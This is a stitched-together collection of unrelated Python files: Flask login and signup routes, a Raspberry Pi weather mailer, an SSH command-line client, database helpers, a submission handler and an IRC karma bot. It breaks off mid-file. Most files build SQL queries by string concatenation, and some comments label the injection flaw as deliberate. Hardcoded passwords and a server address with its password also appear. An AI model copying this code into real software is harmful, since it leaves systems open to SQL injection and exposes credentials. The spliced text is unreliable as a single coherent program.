DATABASE = "chew_snap_database.db"

@app.route("/", methods=["GET", "POST"])
def hello():
    #if request.method == "GET":
    print "someone said get"
    return "What's up santosh"
    

@app.route("/login", methods=["GET", "POST"])
def request_login():
    print "user requesting login"
    print str(request.form)
    parameters = str(request.form)[22:]
    parameters = parameters[:-9]
    print parameters
    dic = ast.literal_eval(parameters)
    email = dic["email"]
    password = dic["password"]
    print (email)
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE email='"+email+"'")                    
    user = c.fetchone()
    print user
    conn.close()
    if(not user):
        # user does not exist
        return "login_404_NOTFOUND"
    else:
        # user does exist   
        name = user[1]
        email = user[2]
        hashed = user[3]
        hashed = hashed.encode('ascii', 'ignore') # mreencode the unicode hash
        if(bcrypt.hashpw(password, hashed)==hashed): #check if password hash matches
            return "login_200_FOUND " + name
        else:
            return "login_201_INVALID"

@app.route("/signup", methods=["GET", "POST"])
def request_signup():
    print "user requesting signup"
    # print str(request.form)
    parameters = str(request.form)[22:] #remove immutable dict tags
    parameters = parameters[:-9]
    print parameters
    dic = ast.literal_eval(parameters)
    name = dic["name"]
    email = dic["email"]
    password = dic["password"]
    print (name + " " + email)
    hashed = bcrypt.hashpw(password, bcrypt.gensalt());
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE email='"+email+"'")                    
    user = c.fetchone()
    if(user != None):
        return "signup_409_USEREXISTS"
    else:
        c.execute('SELECT COUNT(userid) FROM users')
        count = c.fetchone()[0]
        c.execute("INSERT INTO users VALUES("+str(count)+", '"+name+"', '"+email+"', '"+hashed+"')")                    
        conn.commit()
        conn.close()
        return "signup_200_OK"



if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)

from sense_hat import SenseHat, ACTION_PRESSED, ACTION_HELD, ACTION_RELEASED
from pattern_ctrl import PatternInputController
from smtplib import SMTP, SMTPException
import time
import signal
import os
import mysql.connector

class WeatherApp():

	def __init__(self):
		self.sense = SenseHat()
		self.pattern_ctrl = PatternInputController(self.sense)
		signal.signal(signal.SIGINT, self.sigint_handler)

		self.sender = "diegogarcialozano95@gmail.com"
		self.pwd = "weatherapp"

		self.message = "From: From Raspberry Weather App <diegogarcialozano95@gmail.com>"
		self.message += "\nTo: To {username} <{usermail}>"
		self.message += "\nSubject: Weather App Report\n"
		self.message += "\n Hello {username1} ! Here is the weather data that was recorded:\n"
		self.message += "\n Temperature: {temp:.2f} Celsius"
		self.message += "\n Pressure: {press:.2f} Milibars"
		self.message += "\n Humidity: {humid:.2f} %"
		self.message += "\n\n Next report will be in {wait} seconds"

		while True:
			os.system("clear")
			self.sense.clear()
			print "Enter your Username and then your pattern in the Raspberry Pi"
			print "Type 'exit' to close \n"
			
			username = raw_input("Username: ")
			if username == "exit":
				print "\nBye!!"
				self.sense.show_message("Bye!!")
				break
			print "\nEnter your authentication pattern in the Raspberry Pi"
			print "\n  - Move the joystick to move around"
			print "\n  - Push the joystick to select/deselect"
			print "\n  - Press any place along the green lines to submit"
			pattern = self.pattern_ctrl.get_input_pattern()
			pattern = self.pattern_to_string(pattern)
			try:
				self.login(username,pattern)
				self.sense.load_image("res/success.png")
				print "\n\nWelcome " + self.user_logged['name'] + " !"
				print "\nPress Ctrl + C to  logout"
				time.sleep(2)
				self.sense.clear()
				self.record_weather()
			except Exception as error:
				self.sense.load_image("res/error.png")
				print "\nAn error has occured:\n"
				print error
				print "\nPress Enter to continue"
				raw_input()				
				self.sense.clear()
		
	def send_mail(self,t,p,h):
		try:
			self.smtp = SMTP("smtp.gmail.com:587")
			self.smtp.ehlo()
			self.smtp.starttls()
			self.smtp.login(self.sender, self.pwd)
			self.message = self.message.format(username=self.user_logged['name'],
					    usermail=self.user_logged['mail'],
					    username1=self.user_logged['name'],
					    temp = t,
					    press = p,
					    humid = h,
					    wait = self.user_logged['wait'])
			self.smtp.sendmail(self.sender, [self.user_logged['mail']], self.message)
			self.smtp.quit()
		except SMTPException:
			print "Error: unable to send email"

	def record_weather(self):
		self.logout = False
		while self.logout == False:
			timer = 0

			temperature = self.sense.get_temperature()
			pressure = self.sense.get_humidity()
			humidity = self.sense.get_pressure()

			self.send_mail(temperature,pressure,humidity)

			while self.logout == False and timer < self.user_logged['wait']:
				self.animation()
				timer += 1
		self.logout = False
			
	def animation(self):
		"One second animation"
		self.sense.load_image("res/cloud1.png")
		time.sleep(0.25)
		self.sense.load_image("res/cloud2.png")
		time.sleep(0.25)
		self.sense.load_image("res/cloud3.png")
		time.sleep(0.25)
		self.sense.load_image("res/cloud4.png")
		time.sleep(0.25)

	def sigint_handler(self, signum, frame):
		self.logout = True

	def pattern_to_string(self, pattern):
		for i in range(len(pattern)):
			pattern[i] = "Y" if pattern[i] == True else "N"
		return ''.join(pattern)

	def login(self, username, pattern):
		cnx = mysql.connector.connect(user='root', password='p@ssword',host='127.0.0.1',database='weather_app')
		query = ("SELECT name,email,record_time FROM users WHERE users.name = '{}' AND users.pattern = '{}';".format(username,pattern))                    
		cursor = cnx.cursor()
		cursor.execute(query)
		result = []
		for row in cursor:
			result.append(row)
		cursor.close()
		cnx.close()
		if len(result) > 0:
			self.user_logged = { 'name': result[0][0],
					     'mail': result[0][1],
					     'wait': result[0][2] }
		else:
			raise Exception("User not found")
		
if __name__ == "__main__":
	weather_app = WeatherApp()


import cmd
import getpass

import paramiko

from shrub.scripts.validate import validate

CONNECTION_STRING = 'shrub@104.236.0.123'
SERVER_PASSWORD = 'swordfish'

class Shrub(cmd.Cmd):
    prompt = "shrub> "
    intro = """Welcome to shrub!\nTo get started, try "help".\n"""

    doc_header = "Available commands:"
    ruler = '-'

    user_creds = []

    ##### OVERRIDES #####
    def emptyline(self):
        # Follow shell behavior; do nothing and just print a new prompt.
        pass

    def default(self, line):
        
        #if not self.logged_in():
        #    print("""shrub: unauthenticated; use "login [username] to log in first""")
        #    return
        if not validate(line):
            print("""shrub: {}: command not found. Try "help".""".format(line.split(' ', 1)[0]))
            return
        message = self.send_cmd(line, self.user_creds)
        print(message)
        return
        
        print("""shrub: {}: command not found. Try "help".""".format(line.split(' ', 1)[0]))

    def do_EOF(self, line):
        """Send EOF (Ctrl-D) to exit."""
        print("\nBye!")
        return True

    ##### INSECURE MODE #####
    insecure_mode = ''

    def do_insecure_on(self, line):
        """Turns on INSECURE MODE and begin using insecure code paths."""
        self.insecure_mode = ' --insecure'
        print("*** Using insecure code paths.")

    def do_insecure_off(self, line):
        """Turns off INSECURE MODE and go back to using normal code paths."""
        self.insecure_mode = ''
        print("*** No longer using insecure code paths.")

    ##### COMMANDS #####
    def do_register(self, line):
        """register [username]
        Register for a new shrub account. The username should be your Github username.
        You will be prompted for your desired shrub password, then your Github password."""
        linesplit = line.split()                    
        if not len(linesplit) == 1:
            print("register: incorrect arguments; input only your username")
            return
        username = linesplit[0]

        response = send_unauthenticated_cmd("check_username_exists {}".format(username))

        # TODO: Coordinate with server code
        if response == "True":
            print("Sorry, that username's already taken.")
            return

        shrub_pass = getpass.getpass(prompt="New shrub password: ")
        github_pass = getpass.getpass(prompt="Github password: ")

        response = send_unauthenticated_cmd("register{} {} {} {}".format(self.insecure_mode, username, shrub_pass, github_pass))
        print(response)

    def do_login(self, line):
        """login [username]
        Authenticate yourself to Shrub. You will be prompted for your password."""
        if self.logged_in():
            print("shrub: login: already logged in; restart shrub to login as a different user")
            return

        linesplit = line.split()                    
        if not len(linesplit) == 1:
            print("login: incorrect arguments; input only your username")
            return
        else:
            username = linesplit[0]

        password = getpass.getpass()

        # TODO: determine server reaction; basically check if username/pass is correct
        # if so, store username/pass in memory on client and keep sending it with future commands
        response = send_unauthenticated_cmd("check_login {} {}".format(username, password))
        if response == "True":
            print("Success: now logged in as {}.".format(username))
            self.user_creds = [username, password]
        else:
            print("shrub: login: authentication failure")

    def do_list_issues(self, line):
        if not self.logged_in():
            print("""shrub: unauthenticated; use "login [username] to log in first""")
            return
        response = self.send_cmd("list_issues{} {}".format(self.insecure_mode, line))
        print(response)

    def do_list_repo_issues(self, line):
        if not self.logged_in():
            print("""shrub: unauthenticated; use "login [username] to log in first""")
            return
        response = self.send_cmd("list_repo_issues{} {}".format(self.insecure_mode, line))
        print(response)

    def do_list_comments(self, line):
        if not self.logged_in():
            print("""shrub: unauthenticated; use "login [username] to log in first""")
            return
        response = self.send_cmd("list_comments{} {}".format(self.insecure_mode, line))
        print(response)

    def do_create_issue(self, line):
        if not self.logged_in():
            print("""shrub: unauthenticated; use "login [username] to log in first""")
            return
        response = self.send_cmd("create_issue{} {}".format(self.insecure_mode, line))
        print(response)

    def do_create_comment(self, line):
        if not self.logged_in():
            print("""shrub: unauthenticated; use "login [username] to log in first""")
            return
        response = self.send_cmd("create_comment{} {}".format(self.insecure_mode, line))
        print(response)

    def do_edit_issue(self, line):
        if not self.logged_in():
            print("""shrub: unauthenticated; use "login [username] to log in first""")
            return
        response = self.send_cmd("edit_issue{} {}".format(self.insecure_mode, line))
        print(response)

    def do_edit_comment(self, line):
        if not self.logged_in():
            print("""shrub: unauthenticated; use "login [username] to log in first""")
            return
        response = self.send_cmd("edit_comment{} {}".format(self.insecure_mode, line))
        print(response)

    def do_delete_comment(self, line):
        if not self.logged_in():
            print("""shrub: unauthenticated; use "login [username] to log in first""")
            return
        response = self.send_cmd("delete_comment{} {}".format(self.insecure_mode, line))
        print(response)

    ##### HELPERS #####
    def logged_in(self):
        return len(self.user_creds) == 2

    def send_cmd(self, command_string):
        if not self.logged_in():
            exit("send_cmd called before login")
        client = open_ssh_client()
        stdin, stdout, stderr = client.exec_command("shrubbery {} {} ".format(self.user_creds[0], self.user_creds[1]) + command_string)
        print("***stdout: " + stdout.read().decode("utf-8"))
        print("***stderr: " + stderr.read().decode("utf-8"))
        return stdout.read().decode("utf-8")

##### NON-MEMBER HELPERS #####
def send_unauthenticated_cmd(command_string):
    """
        Execute a shrub command on the server that doesn't require
        username and password, and return stdout as a string.
    """
    client = open_ssh_client()
    stdin, stdout, stderr = client.exec_command("shrubbery " + command_string)
    print("***stdout: " + stdout.read().decode("utf-8"))
    print("***stderr: " + stderr.read().decode("utf-8"))
    return stdout.read().decode("utf-8")

def open_ssh_client():
    """
        Return an open paramiko.SSHClient instance.
    """
    (username, hostname) = get_connection_tuple(CONNECTION_STRING)
    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(username=username, password=SERVER_PASSWORD, hostname=hostname)
    return client

def get_connection_tuple(connection_string):
    """
        Return the username and hostname from an arbitrary connection
        string. Returns None if the supplied string is invalid.
    """
    connection_array = connection_string.split('@')
    if len(connection_array) == 2:
        username = connection_array[0]
        servername = connection_array[1]
    else:
        return (None, None)
    return (username, servername)

def invoke_cli():
    Shrub().cmdloop()

import pymysql
import dbconfig

class DBHelper:
	def connect(self, database='crimemap'):
		return pymysql.connect(host='localhost', user=dbconfig.db_user, password=dbconfig.db_password, db=database)

	def get_all_inputs(self):
		connection=self.connect()
		try:
			query='SELECT description FROM crimes;'
			with connection.cursor() as cursor:
				cursor.execute(query)                    
			return cursor.fetchall()
		finally:
			connection.close()

	def add_input(self, data):
		connection=self.connect()
		try:
			# The following introduces a deliberate security flaw
			query="INSERT INTO crimes (description) VALUES('{}');".format(data)
			with connection.cursor() as cursor:
				cursor.execute(query)                    
				connection.commit()
		finally:
			connection.close()

	def clear_all(self):
		connection=self.connect()
		try:
			query='DELETE FROM crimes;'
			with connection.cursor() as cursor:
				cursor.execute(query)                    
				connection.commit()
		finally:
			connection.close()

from __future__ import unicode_literals

import collections
import datetime
import hashlib
import itertools
import os.path
import re
import time

from . import (
    commands,
    helper,
    sheet,
    student,
    sendmail,
)

Submission = collections.namedtuple(
    'Submission',
    ['id', 'sheet_id', 'student_id', 'time', 'files_path', 'deleted'])


def _match_subject(subject):
    return re.match(r'^Abgabe\s*(?P<id>[0-9]+)', subject)


def sheet_by_mail(db, uid, message):
    subject = helper.get_header(message, 'Subject', '')
    sheet_m = _match_subject(subject)
    if not sheet_m:
        raise helper.MailError(uid, 'Invalid subject line, found: %s' % subject)
    sheet_id_str = sheet_m.group('id')
    assert re.match(r'^[0-9]+$', sheet_id_str)
    sheet_id = int(sheet_id_str)

    res = sheet.get_by_id(db, sheet_id)
    if not res:
        raise helper.MailError(uid, 'Could not find a sheet with id %s' % sheet_id)
    return res


def create(db, sheet_id, student_id, timestamp, files_path, deleted=0):
    db.cursor.execute(
        """INSERT INTO submission
            (sheet_id, student_id, time, files_path, deleted)
            VALUES (?, ?, ?, ?, ?)""",
        (sheet_id, student_id, timestamp, files_path, deleted)
    )
    submission_id = db.cursor.lastrowid
    db.database.commit()
    return Submission(submission_id, sheet_id, student_id, timestamp, files_path, 0)


def add_file(self, submission_id, hash, filename, size):
    self.cursor.execute(
        """INSERT INTO file (submission_id, hash, filename, size)
           VALUES(?, ?, ?, ?)""", (submission_id, hash, filename, size))
    self.database.commit()


def handle_mail(config, db, imapmail, uid, message):
    subject = helper.get_header(message, 'Subject', '(none)')
    if not _match_subject(subject):
        return  # Interactive mail, we don't care about those

    alias = message.get('From', 'anonymous')
    try:
        stu = student.resolve_alias(db, alias)
        sheet = sheet_by_mail(db, uid, message)

        now_ts = time.time()
        now_dt = datetime.datetime.fromtimestamp(now_ts)
        now_str = now_dt.strftime('%Y-%m-%d_%H-%M-%S_%f')

        files_path = os.path.join(
            config("attachment_path"),
            helper.escape_filename(str(stu.id)),
            helper.escape_filename(str(sheet.id)),
            helper.escape_filename(now_str)
        )
        if os.path.exists(files_path):
            orig_files_path = files_path
            for i in itertools.count(2):
                files_path = '%s___%s' % (orig_files_path, i)
                if not os.path.exists(files_path):
                    break

        subm = create(db, sheet.id, stu.id, int(now_ts), files_path)

        mailtext = b""

        os.makedirs(files_path)
        for subpart in message.walk():
            fn = subpart.get_filename()
            payload = subpart.get_payload(decode=True)

            if not payload:
                continue

            if fn:
                # file part
                payload_name = helper.escape_filename(fn)
                payload_path = os.path.join(files_path, payload_name)
                payload_size = len(payload)
                hash_str = 'sha256-%s' % hashlib.sha256(payload).hexdigest()
                with open(payload_path, "wb") as payload_file:
                    payload_file.write(payload)

                add_file(db, subm.id, hash_str, payload_name, payload_size)
            else:
                # message part
                if mailtext:
                    mailtext += b"\n\n--- Part ---\n"
                mailtext += payload

        if mailtext:
            # write "mail" file
            payload_path = os.path.join(files_path, "mail")
            payload_size = len(mailtext)
            hash_str = 'sha256-%s' % hashlib.sha256(mailtext).hexdigest()
            with open(payload_path, "wb") as payload_file:
                payload_file.write(mailtext)

            add_file(db, subm.id, hash_str, "mail", payload_size)

        commands.move(config, imapmail, uid, "Abgaben")

        sendmail.send_template(config, alias, "Mail erhalten: %s" % subject, "mail_received.html")
    except helper.MailError as me:
        sendmail.send_template(config, alias, "Mail fehlerhaft: %s" % subject, "mail_sheet_not_found.html")
        raise me


def get_for_student(db, student_id):
    db.cursor.execute(
        """SELECT id, sheet_id, student_id, time, files_path, deleted
           FROM submission WHERE student_id = ?""", (student_id,))
    rows = db.cursor.fetchall()
    return [Submission(*row) for row in rows]


def get_all(db):
    db.cursor.execute(
        """SELECT id, sheet_id, student_id, time, files_path, deleted
           FROM submission WHERE deleted IS NOT 1""")
    rows = db.cursor.fetchall()
    return [Submission(*row) for row in rows]


def get_full_by_id(db, id):                    
    return get_full_sql(db, "submission.id = %s" % id)[0]                    


def get_all_full(db):
    return get_full_sql(db, "")


def get_full_sql(db, filter):                    
    db.cursor.execute("""SELECT
                         submission.id,
                         submission.sheet_id,
                         submission.student_id,
                         submission.time,
                         submission.files_path,
                         student.primary_alias,
                         grading_result.grader,
                         grading_result.decipoints,
                         grading_result.status
                         FROM
                         submission
                         INNER JOIN student ON
                         submission.student_id = student.id
                         AND student.deleted IS NOT 1
                         AND submission.deleted IS NOT 1
                         %s
                         LEFT OUTER JOIN grading_result ON
                         submission.id = grading_result.submission_id
                         ORDER BY submission.id DESC
                         """ %
                      (" AND %s" % filter if filter else ""))                    
    rows = db.cursor.fetchall()

    all_full = []

    for row in rows:
        id, sheet_id, student_id, time, files_path, primary_alias, grader, decipoints, status = row
        all_full.append({
            "id": id,
            "sheet_id": sheet_id,
            "student_id": student_id,
            "time": time,
            "files_path": files_path,
            "primary_alias": primary_alias,
            "grader": grader,
            "decipoints": decipoints,
            "status": status if status else "Unbearbeitet"
        })

    return all_full


def get_current_full(db):
    current_submission = []

    for sub in get_all_full(db):
        found_older_submission_index = -1
        found_correct_student_and_sheet = False

        for index, cursub in enumerate(current_submission):
            if sub["student_id"] == cursub["student_id"] and sub["sheet_id"] == cursub["sheet_id"]:
                found_correct_student_and_sheet = True
                if sub["time"] > cursub["time"]:
                    found_older_submission_index = index
                break

        if not found_correct_student_and_sheet:
            # We found no previous submission from this student for this sheet
            current_submission.append(sub)
        elif found_older_submission_index > -1:
            # We found the student/sheet combination but it is older (based on the timestamp)
            # than the one we are checking for
            current_submission[found_older_submission_index] = sub

    return current_submission


def get_all_newest(db):
    db.cursor.execute("""SELECT id, sheet_id, student_id, time, files_path FROM
                         submission ORDER BY time DESC""")
    rows = db.cursor.fetchall()

    registered = set()
    submissions = []
    for row in rows:
        id, sheet_id, student_id, time, files_path = row
        if (sheet_id, student_id) in registered:
            continue
        registered.add((sheet_id, student_id))
        submissions.append(Submission(*row))

    return submissions


def get_from_id(db, submission_id):
    db.cursor.execute("""SELECT id, sheet_id, student_id, time, files_path, deleted FROM submission
                         WHERE id = ?""", (submission_id, ))
    row = db.cursor.fetchone()
    if not row:
        raise ValueError('Cannot find submission')
    return Submission(*row)

#!/usr/bin/env python
import mysql.connector
import os
import time
import datetime
import calendar
import hashlib
import sys
import argparse

# Establish database connection
db = mysql.connector.connect(host="localhost",
                             user="root",
                             passwd="root",
                             db="elixir",
                             buffered=True)

cur = db.cursor()


def get_file_size(path):
    """ This function reads a file and returns
    it's byte size as numeral string """
    return os.path.getsize(path)


def get_file_age(path):
    """ This function reads a file and returns it's last
    modified date as mtime(float) in string form """
    return os.path.getmtime(path)


def get_time_now():
    """ This function returns the current time
    as mtime(float) in string form """
    return calendar.timegm(time.gmtime())


def db_get_file_details(path):
    """ This function queries the database for details
    and returns a list of results or false """
    status = {'id': 0,                    
              'name': 0,                    
              'size': 0,                    
              'age': 0,                    
              'passes': 0,                    
              'verified': 0}                    
    cur.execute('SELECT * '
                'FROM files '
                'WHERE name="' + path + '";')
    result = cur.fetchall()
    if cur.rowcount >= 1:
        for row in result:
            # See other/db_script.txt for table structure
            status = {'id': row[0],
                      'name': path,
                      'size': int(row[2]),
                      'age': float(row[3]),
                      'passes': row[4],
                      'verified': row[5]}
    return status


def db_update_file_details(path):
    """ This function updates file size and age to database
    as well as resets the passes value to zero"""
    file_size = get_file_size(path)
    file_age = get_file_age(path)
    file_id = db_get_file_details(path)['id']
    params = [file_size, file_age, file_id]
    cur.execute('UPDATE files '
                'SET size=%s, '
                'age=%s, '
                'passes=0 '
                'WHERE id=%s;',
                params)
    db.commit()
    return


def db_increment_passes(path):
    """ This function increments the number of passes by 1 """
    file_id = db_get_file_details(path)['id']
    file_passes = db_get_file_details(path)['passes']+1
    params = [file_passes, file_id]
    cur.execute('UPDATE files '
                'SET passes=%s '
                'WHERE id=%s;',
                params)
    db.commit()
    return


def db_insert_new_file(path):
    """ This function creates a new database entry database
    table structure can be viewed in other\db_script.txt """
    file_size = get_file_size(path)
    file_age = get_file_age(path)
    params = [path, file_size, file_age]
    cur.execute('INSERT INTO files '
                'VALUES (NULL, %s, %s, %s, 0, 0);',
                params)
    db.commit()
    return


def log_event(path):
    """ This function prints the event to log """
    time_now = get_time_now()
    file_size = db_get_file_details(path)['size']
    file_age = db_get_file_details(path)['age']
    file_passes = db_get_file_details(path)['passes']
    print(time_now, '>', path,
          ' Current size: ', file_size,
          ' Last updated: ', file_age,
          ' Number of passes: ', file_passes)
    return


def hash_md5_for_file(path):
    """ This function reads a file and returns a
    generated md5 checksum """
    hash_md5 = hashlib.md5()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            hash_md5.update(chunk)
        path_md5 = hash_md5.hexdigest()
    return path_md5


def get_md5_from_file(path):
    """ This function reads a file type file.txt.md5
    and returns the  md5 checksum """
    key_md5 = path + '.md5'
    key_md5 = open(key_md5, 'r')
    key_md5 = key_md5.read()
    return key_md5


def db_verify_file_integrity(path):
    """ This function updates file verified status from 0 to 1 """
    file_id = db_get_file_details(path)['id']
    params = [1, file_id]
    cur.execute('UPDATE files '
                'SET verified=%s '
                'WHERE id=%s;',
                params)
    db.commit()
    return


'''*************************************************************'''
#                         cmd-executable                          #
'''*************************************************************'''


def main(arguments=None):
    """ This function runs the script when executed and given
    a directory as parameter """
    path = parse_arguments(arguments).message
    for file in os.listdir(path):
        if file.endswith('.txt'):
            if db_get_file_details(file)['id'] > 0:                    
                # Old file
                if db_get_file_details(file)['verified'] == 0:
                    # File is not verified
                    if (get_file_size(file) >
                        db_get_file_details(file)['size']):                    
                        # File size has changed
                        db_update_file_details(file)
                    else:
                        # File size hasn't changed
                        if (get_time_now() -
                            db_get_file_details(file)['age']) > 60:                    
                            # File is older than 60s
                            if db_get_file_details(file)['passes'] >= 3:
                                # At least 3 passes
                                if (hash_md5_for_file(file) ==
                                    get_md5_from_file(file)):                    
                                    # Verify md5 checksum
                                    db_verify_file_integrity(file)
                            else:
                                # Increment passes
                                db_increment_passes(file)
                    log_event(file)
            else:
                # New file
                db_insert_new_file(file)
                log_event(file)
    return


def parse_arguments(arguments):
    """ This function returns the parsed argument (path) """
    parser = argparse.ArgumentParser()
    parser.add_argument('message')
    return parser.parse_args(arguments)


if __name__ == '__main__':
    RETVAL = main()
    sys.exit(RETVAL)

from dbhelper import BDHelper                    
from flask import Flask
from flask import render_template
from flask import request

app = Flask(__name__)
DB = DBHelper()

@app.route('/')
def home():
    try:
        data = DB.get_all_inputs()
    except Exception as e:
        print(e)
        data = None

    return render_template('home.html', data=data)

@app.route('/add', methods=['POST'])
def add():
    try:
        data = request.form.get('userinput')
        DB.add_input(data)
    except Exception as e:
        print(e)

    return home()

@app.route('/clear')
def clear():
    try:
        DB.clear_all()
    except Exception as e:
        print(e)

    return home()

if __name__ == '__main__':
    app.run(port=5000, debug=True)

import pymysql
import dbconfig

class DBHelper:
    def connect(self, database='crimemap'):
        return pymysql.connect(host='localhost',
                               user=dbconfig.db_user,
                               passwd=dbconfig.db_password,
                               db=database)

    def get_all_inputs(self):
        connection = self.connect()
        try:
            query = 'SELECT description FROM crimes;'
            with connection.cursor() as cursor:
                cursor.execute(query)                    

                return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self, data):
        connection = self.connect()
        try:
            # The following is susceptable to SQL injection
            query = "INSERT INTO crimes (description) VALUES ('{}');" \                    
                    .format(data)                    
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

    def clear_all(self):
        connection = self.connect()
        try:
            query = 'DELETE FROM crimes;'
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

import json
import urllib
import math
import cx_Oracle

from db_access import db_ops
from model import user
from db_access.exceptions import printException, printf, get_error_message

class UserConsoleController(object):
	items_per_page = 20

	def __init__(self, request):
		# List of strings, each is an error. Add with self.error_messages.append(error_message)
		self.error_messages = []

		try:
			db_conn = db_ops.get_connection()
		except cx_Oracle.DatabaseError, exception:
			del self.error_messages[:]
			self.error_messages.append("Sorry, but we could't connect to the WEGAS Database\n")
			self.error_messages.append(exception)
			
		query = request.query
		self.page = int(query.get("page", 1))
		self.filter = query.get("filter", "")
		self.max_page = self.get_page_count(db_conn, self.filter)
		print "for a total max page of {}".format(self.max_page)
		
		error_msg_json = query.get("errors", None)
		if error_msg_json is not None:
			self.error_messages += json.loads(error_msg_json)
		
		# List of objects of type User 
		self.users = self.get_users(db_conn, self.page, self.filter)

		self.fetch_id = query.get("fetch_id", "")
		if self.fetch_id is not "":
			fetch_user = self.get_user(self.fetch_id)
			self.fetch_username, self.fetch_password, self.fetch_mmr, self.fetch_level =\
				fetch_user.name, "", fetch_user.mmr, fetch_user.playerLevel
		else:
			self.fetch_username, self.fetch_password, self.fetch_mmr, self.fetch_level = "", "", "", ""

		self.page_prev_url = None if self.page == 1 else build_link(self.page - 1, self.filter, self.fetch_id)
		self.page_next_url = None if self.page == self.max_page else build_link(self.page + 1, self.filter, self.fetch_id)

		min_page = max(self.page - 4, 1)
		max_page = min(self.max_page, min_page + 10)
		self.pages = [(nr, build_link(nr, self.filter, self.fetch_id)) for nr in xrange(min_page, max_page + 1)]
		# TODO: handle errors and add error messages
		
	def get_users(self, conn, page, name_filter):
		cursor = conn.cursor()
		try:
			cursor.execute("select * from table(user_ops.getUsers(:row_start, :row_count, :filter))",
				{
					"row_start": int((page - 1) * UserConsoleController.items_per_page + 1),
					"row_count": int(UserConsoleController.items_per_page),
					"filter": str(name_filter)
				}
			)
			return [user.User(*row) for row in cursor]
		except cx_Oracle.DatabaseError, exception:
			print 'Failed to get users from WEGAS'
			printException(exception)
			self.error_messages.append('Faild to get users from WEGAS\n')
			self.error_messages.append(exception)

	def get_user(self, conn, user_id):
		cursor = conn.cursor()

		cursor.execute("select * from player where id = :id", {"id": user_id})
		return user.User(*(cursor.fetchone()))

	def get_page_count(self, conn, name_filter):
		cursor = conn.cursor()
		if filter:
			# SQL injection secured:
			# cursor.execute("select count(*) from player where playername like '%' || :name_filter || '%'", {"name_filter": name_filter})
			# SQL injection vulnerable:
			stmt = "select count(*) from player where playername like '%{}%'".format(name_filter)
			print stmt
			cursor.execute(stmt)
		else:
			cursor.execute("select count(*) from player")	
		nr_raw = cursor.fetchone()[0]
		print "Total {} users matching filter".format(nr_raw)
		return int(math.ceil(float(nr_raw) / UserConsoleController.items_per_page))

		try:
			cursor.execute("select * from players where id = :id", {"id": user_id})
			return users.User(*(cursor.fetchone()))
		except cx_Oracle.DatabaseError, exception:
			self.error_messages.append('Sorry, we couldn\'t find the user for your ID \n')
			self.error_messages.append(exception)

	def get_view(self):
		#return ".view/admin/admin_page.html"
		return ".view/admin/admin_page.html"


def build_link(page, name_filter, fetch_id):
	link_base = "/admin/user_console"
	if page is None and filter is None and fetch_id is None:
		return link_base
	
	link_query = link_base + "?"
	link_chr = ""

	if page is not None:
		link_query += link_chr + "page=" + urllib.quote_plus(str(page))
		link_chr = '&'

	if name_filter:
		 link_query += link_chr + "filter=" + urllib.quote_plus(str(name_filter))
		 link_chr = '&'

	if fetch_id:
		link_query += link_chr + "fetch_id=" + urllib.quote_plus(str(fetch_id))
		link_chr = '&'

	return link_query


# coding=utf8
"""
karma.py

Original work Copyright 2014 Max Gurela
Modified work Copyright 2015 Red Hat

Licensed under the Eiffel Forum License 2.
"""
from __future__ import unicode_literals
from sopel.module import rate, rule, commands, require_privilege, OP
from sopel.tools import Identifier


@rate(10)
@rule(r'^([\S]+?)\+\+$')
# @commands('inc')
def promote_karma(bot, trigger):
    """
    Update karma status for specify IRC user if get '++' message.
    """
    if (trigger.is_privmsg):
        return bot.say('People like it when you tell them good things.')
    if (bot.db.get_nick_id(Identifier(trigger.group(1))) == bot.db.get_nick_id(Identifier(trigger.nick))):                    
        return bot.say('You may not give yourself karma!')
    current_karma = bot.db.get_nick_value(trigger.group(1), 'karma')
    if not current_karma:
        current_karma = 0
    else:                    
        current_karma = int(current_karma)
    current_karma += 1

    bot.db.set_nick_value(trigger.group(1), 'karma', current_karma)
    bot.say(trigger.group(1) + ' == ' + str(current_karma))


@rate(10)
@rule(r'^([\S]+?)\-\-$')
# @commands('dec')
def demote_karma(bot, trigger):
    """
    Update karma status for specify IRC user if get '--' message.
    """
    if (trigger.is_privmsg):
        return bot.say('Say it to their face!')
    if (bot.db.get_nick_id(Identifier(trigger.group(1))) == bot.db.get_nick_id(Identifier(trigger.nick))):                    
        return bot.say('You may not reduce your own karma!')
    current_karma = bot.db.get_nick_value(trigger.group(1), 'karma')
    if not current_karma:
        current_karma = 0
    else:                    
        current_karma = int(current_karma)
    current_karma -= 1

    bot.db.set_nick_value(trigger.group(1), 'karma', current_karma)
    bot.say(trigger.group(1) + ' == ' + str(current_karma))


@rate(10)
@rule(r'^([\S]+?)\=\=$')
def show_karma(bot, trigger):
    """
    Update karma status for specify IRC user if get '--' message.
    """
    current_karma = bot.db.get_nick_value(trigger.group(1), 'karma')
    if not current_karma:
        current_karma = 0
    else:                    
        current_karma = int(current_karma)

    bot.say(trigger.group(1) + ' == ' + str(current_karma))


@commands('karma')
#@example('.karma nick')
def karma(bot, trigger):
    """
    Command to show the karma status for specify IRC user.
    """
    nick = trigger.nick
    if trigger.group(2):                    
        nick = trigger.group(2).strip().split()[0]

    karma = bot.db.get_nick_value(nick, 'karma')
    if not karma:
        karma = '0'
    bot.say("%s == %s" % (nick, karma))


@require_privilege(OP)
@commands('setkarma')
#@example('.setkarma nick 99')
def set_karma(bot, trigger):
    """
    Set karma status for specific IRC user.
    """

    if trigger.group(2):                    
        nick = trigger.group(2).strip().split()[0]
        value = int(trigger.group(2).strip().split()[1])

    bot.db.set_nick_value(nick, 'karma', value)
    bot.say("%s == %s" % (nick, value))


@rate(10)
@commands('karmatop')
#@example('.karmatop 3')
def top_karma(bot, trigger):
    """
    Show karma status for the top n number of IRC users.
    """
    if trigger.group(2):                    
        top_limit = int(trigger.group(2).strip())
    else:                    
        top_limit = 5

    karmalist = bot.db.execute("SELECT slug, value FROM nick_values NATURAL JOIN nicknames WHERE key = 'karma' ORDER BY value DESC LIMIT " + str(top_limit)).fetchall()                    
    for user in karmalist:
        bot.say("%s == %s" % (user[0], user[1]))

# coding=utf8
"""
karma.py

Original work Copyright 2014 Max Gurela
